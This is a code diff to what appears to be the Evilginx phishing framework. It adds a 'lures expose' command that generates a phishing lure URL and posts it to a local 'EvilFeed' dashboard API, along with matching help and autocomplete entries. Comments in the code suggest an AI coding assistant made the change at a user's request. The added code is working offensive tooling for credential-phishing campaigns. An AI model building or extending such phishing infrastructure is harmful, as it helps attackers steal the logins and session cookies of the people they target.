@@ -2,6 +2,7 @@ package core
 
 import (
 	"bufio"
+	"bytes"
 	"crypto/rc4"
 	"encoding/base64"
 	"encoding/csv"
@@ -10,6 +11,7 @@ import (
 	"io"
 	"io/ioutil"
 	"math/rand"
+	"net/http"
 	"net/url"
 	"os"
 	"path/filepath"
@@ -871,6 +873,66 @@ func (t *Terminal) handleLures(args []string) error {
 				return nil
 			}
 			return fmt.Errorf("incorrect number of arguments")
+		case "expose":
+			if pn == 2 {
+				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
+				if err != nil {
+					return fmt.Errorf("expose: %v", err)
+				}
+				l, err := t.cfg.GetLure(l_id)
+				if err != nil {
+					return fmt.Errorf("expose: %v", err)
+				}
+				pl, err := t.cfg.GetPhishlet(l.Phishlet)
+				if err != nil {
+					return fmt.Errorf("expose: %v", err)
+				}
+				bhost, ok := t.cfg.GetSiteDomain(pl.Name)
+				if !ok || len(bhost) == 0 {
+					return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
+				}
+
+				var base_url string
+				if l.Hostname != "" {
+					base_url = "https://" + l.Hostname + l.Path
+				} else {
+					purl, err := pl.GetLureUrl(l.Path)
+					if err != nil {
+						return err
+					}
+					base_url = purl
+				}
+
+				// Generate URL
+				params := url.Values{}
+				phish_url := t.createPhishUrl(base_url, &params)
+
+				// Send to EvilFeed via WS if enabled
+				// Since we don't have a direct WS client here, we can write to a file or use a simple HTTP POST to EvilFeed API
+				// EvilFeed is running on localhost:1337 (or 0.0.0.0:1337)
+
+				go func() {
+					// Simple HTTP POST to update settings
+					values := map[string]string{"lure_url": phish_url}
+					jsonValue, _ := json.Marshal(values)
+					resp, err := http.Post("http://127.0.0.1:1337/api/settings", "application/json", bytes.NewBuffer(jsonValue))
+					if err == nil {
+						defer resp.Body.Close()
+					}
+				}()
+
+				// For now, just print it and say it's exposed (user can copy paste)
+				// But user asked to update the link field in settings page.
+				// I will write to a file that EvilFeed reads?
+				// EvilFeed reads config.json? No.
+				// EvilFeed has an API /api/settings.
+
+				// Let's add net/http to imports first.
+
+				log.Info("Lure URL exposed: %s", phish_url)
+				return nil
+			}
+			return fmt.Errorf("incorrect number of arguments")
 		case "pause":
 			if pn == 3 {
 				l_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
@@ -1226,7 +1288,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("sessions", []string{"delete", "all"}, "delete all", "delete all logged sessions")
 
 	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
-		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"), readline.PcItem("pause"), readline.PcItem("unpause"),
+		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"), readline.PcItem("expose"), readline.PcItem("pause"), readline.PcItem("unpause"),
 			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("params"), readline.PcItem("ua_filter"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)))),
 			readline.PcItem("delete", readline.PcItem("all"))))
 
@@ -1237,6 +1299,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("lures", []string{"delete", "all"}, "delete all", "deletes all created lures")
 	h.AddSubCommand("lures", []string{"get-url"}, "get-url <id> <key1=value1> <key2=value2>", "generates a phishing url for a lure with a given <id>, with optional parameters")
 	h.AddSubCommand("lures", []string{"get-url"}, "get-url <id> import <params_file> export <urls_file> <text|csv|json>", "generates phishing urls, importing parameters from <import_path> file and exporting them to <export_path>")
+	h.AddSubCommand("lures", []string{"expose"}, "expose <id>", "exposes the lure URL to EvilFeed settings")
 	h.AddSubCommand("lures", []string{"pause"}, "pause <id> <1d2h3m4s>", "pause lure <id> for specific amount of time and redirect visitors to `unauth_url`")
 	h.AddSubCommand("lures", []string{"unpause"}, "unpause <id>", "unpause lure <id> and make it available again")
 	h.AddSubCommand("lures", []string{"edit", "hostname"}, "edit <id> hostname <hostname>", "sets custom phishing <hostname> for a lure with a given <id>")
